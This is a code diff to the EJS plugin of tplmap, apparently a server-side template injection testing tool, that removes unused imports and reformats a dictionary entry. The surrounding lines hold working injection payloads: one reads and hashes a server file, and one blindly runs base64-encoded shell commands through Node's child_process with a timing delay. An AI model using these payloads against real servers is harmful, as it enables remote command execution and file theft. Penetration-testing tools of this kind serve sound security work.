@@ -1,7 +1,4 @@
 from tplmap.plugins.languages import javascript
-from tplmap.utils import rand
-from tplmap.utils.loggers import log
-from tplmap.utils.strings import quote
 
 
 class Ejs(javascript.Javascript):
@@ -23,9 +20,7 @@ class Ejs(javascript.Javascript):
                 "md5": {
                     "md5": """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('%(path)s')).digest("hex")"""
                 },
-                "evaluate": {
-                    "test_os": """global.process.mainModule.require('os').platform()"""
-                },
+                "evaluate": {"test_os": """global.process.mainModule.require('os').platform()"""},
                 "execute_blind": {
                     "execute_blind": """<%%global.process.mainModule.require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i')%%>"""
                 },
